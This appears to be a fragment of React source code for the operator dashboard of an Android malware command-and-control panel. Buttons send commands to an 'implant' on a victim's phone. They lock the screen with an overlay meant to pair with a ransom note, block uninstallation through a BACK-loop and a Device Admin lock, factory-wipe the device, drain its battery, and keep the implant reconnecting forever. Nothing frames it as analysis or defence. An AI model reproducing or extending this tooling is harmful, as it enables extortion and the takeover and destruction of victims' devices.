                  reconnect-forever: jittered 1s→60s backoff on every trigger (boot, network, unlock, charge, resume) — implant never gives up.
                </div>
              </Section>
            )}

            {/* ============ FREEZE ============ */}
            {tab === 'freeze' && (
              <Section title="FREEZE MODULE">
                <div className="flex flex-wrap gap-2">
                  <CmdButton danger label="❄ FREEZE (0xFRZ)" onClick={() => fire({ cmd: CMD.FREEZE, action: 'on' })} busy={busy(CMD.FREEZE)} />
                  <CmdButton label="🔥 Thaw" onClick={() => fire({ cmd: CMD.FREEZE, action: 'off' })} />
                  <CmdButton label="⏱ Freeze 5 min" onClick={() => fire({ cmd: CMD.FREEZE, action: 'on', duration: 300 })} />
                </div>
                <div className="text-[10px] text-slate-600">
                  full-screen black absorbing overlay (top-most, ignores BACK/HOME attempts), locks the device in place; combined with ransom note for pressure.
                </div>
              </Section>
            )}

            {/* ============ APP KICKER ============ */}
            {tab === 'appkicker' && (
              <Section title="APP KICKER">
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="👢 Arm kicker" onClick={() => fire({ cmd: CMD.APPKICKER, action: 'arm' })} busy={busy(CMD.APPKICKER)} />
                  <CmdButton label="⏹ Disarm" onClick={() => fire({ cmd: CMD.APPKICKER, action: 'disarm' })} />
                  <CmdButton label="⚡ Kick current view" onClick={() => fire({ cmd: CMD.APPKICKER, action: 'kick' })} />
                </div>
                <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 text-[11px] font-mono text-slate-400 space-y-1">
                  <div>→ watches for Settings / package installer / device-admin screens</div>
                  <div>→ fires BACK-loop until the view is gone</div>
                  <div>→ blocks <span className="text-rose-300">ACTION_UNINSTALL_PACKAGE</span> intents</div>
                  <div>→ Device Admin wall prevents standard removal</div>
                </div>
              </Section>
            )}

            {/* ============ DANGER ============ */}
            {tab === 'danger' && (
              <Section title="⚠ DANGER ZONE">
                <div className="text-[11px] text-slate-500 mb-3">irreversible or high-impact actions — double-click to confirm.</div>
                <div className="flex flex-wrap gap-2">
                  <CmdButton danger label="🧨 Wipe device (factory)" onClick={() => { if (window.confirm('Factory reset this device?')) fire({ cmd: CMD.WIPE }); }} busy={busy(CMD.WIPE)} />
                  <CmdButton danger label="💣 Self-destruct implant" onClick={() => { if (window.confirm('Delete implant + all logs?')) fire({ cmd: CMD.KILL, action: 'selfdestruct' }); }} busy={busy(CMD.KILL)} />
                  <CmdButton danger label="🔋 Drain battery (loop)" onClick={() => { if (window.confirm('Run battery drain loop?')) fire({ cmd: CMD.DRAIN, action: 'start' }); }} />
                  <CmdButton danger label="🔇 Factory reset watch" onClick={() => fire({ cmd: CMD.WIPEWATCH, action: 'arm' })} />
                </div>
              </Section>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
